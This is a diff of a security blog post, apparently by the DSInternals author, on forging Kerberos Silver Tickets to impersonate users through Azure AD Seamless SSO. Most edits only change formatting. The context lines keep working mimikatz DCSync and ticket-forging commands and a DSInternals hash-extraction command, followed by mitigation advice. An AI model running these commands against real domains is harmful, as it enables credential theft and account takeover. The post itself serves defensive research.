@@ -30,17 +30,17 @@ To&nbsp;test this&nbsp;technique, we need to&nbsp;retrieve some&nbsp;information
 
 1. NTLM password hash of&nbsp;the&nbsp;[AZUREADSSOACC$](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#how-single-sign-on-works) account, e.g. *f9969e088b2c13d93833d0ce436c76dd*. This&nbsp;value can&nbsp;be&nbsp;retrieved from&nbsp;AD using [mimikatz](https://github.com/gentilkiwi/mimikatz):
 
-    ```bat
+    ```batchfile
     mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
     ```
 
     My own [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) could do&nbsp;the&nbsp;same job:
-    
+
     ```powershell
     Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso `
     -Server lon-dc1.contoso.local
     ```
-    
+
     Both of&nbsp;these commands need *Domain Admins* permissions.
 
 2. Name of&nbsp;the&nbsp;AD domain, e.g. *contoso.local*.
@@ -51,10 +51,10 @@ Having this&nbsp;information we can&nbsp;now&nbsp;create and&nbsp;use the&nbsp;S
 
 1. Create the&nbsp;Silver Ticket and&nbsp;inject it&nbsp;into Kerberos cache:
 
-    ```bat
+    ```batchfile
     mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
     ```
-        
+
     ![Mimikatz Silver Ticket Screenshot](../../assets/images/aad_sso3.png)
 
 2. Launch *Mozilla Firefox*.
@@ -70,7 +70,7 @@ Having this&nbsp;information we can&nbsp;now&nbsp;create and&nbsp;use the&nbsp;S
 
 7. To&nbsp;log in&nbsp;as&nbsp;another user, run the&nbsp;command below and&nbsp;repeat steps 1-6.
 
-    ```bat
+    ```batchfile
     klist purge
     ```
 
@@ -92,7 +92,7 @@ As&nbsp;you can&nbsp;see, there is&nbsp;simply no need to&nbsp;panic. But&nbsp;j
 - Protect backups of&nbsp;Domain Controllers, so&nbsp;no-one could [extract sensitive information](/en/dumping-ntds-dit-files-using-powershell/) from&nbsp;them.
 - Enable and&nbsp;enforce [Azure MFA](https://docs.microsoft.com/en-us/azure/multi-factor-authentication/multi-factor-authentication) for&nbsp;users authenticating from&nbsp;external IP addresses. It&nbsp;is&nbsp;very straightforward and&nbsp;effective against many kinds of&nbsp;attacks.
 - Consider implementing [Azure AD conditional access](https://docs.microsoft.com/cs-cz/azure/active-directory/active-directory-conditional-access).
-- Deploy [Microsoft Defender for&nbsp;Identity](https://www.microsoft.com/en-us/cloud-platform/advanced-threat-analytics) to&nbsp;detect malicious replication and&nbsp;other threats to&nbsp;your AD infrastructure.  
+- Deploy [Microsoft Defender for&nbsp;Identity](https://www.microsoft.com/en-us/cloud-platform/advanced-threat-analytics) to&nbsp;detect malicious replication and&nbsp;other threats to&nbsp;your AD infrastructure.
 - Force a&nbsp;password change on the&nbsp;*AZUREADSSOACC$* account by&nbsp;<del>re-deploying Azure AD Connect SSO</del> [running the&nbsp;Update-AzureSSOForest cmdlet](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso-faq#how-can-i-roll-over-the-kerberos-decryption-key-of-the-azureadssoacc-computer-account) after&nbsp;a&nbsp;highly privileged employee leaves the&nbsp;company and/or on a&nbsp;regular basis. This&nbsp;should be&nbsp;done together with&nbsp;resetting the&nbsp;password of&nbsp;*krbtgt* and&nbsp;other sensitive accounts.
 
 ## Conclusion
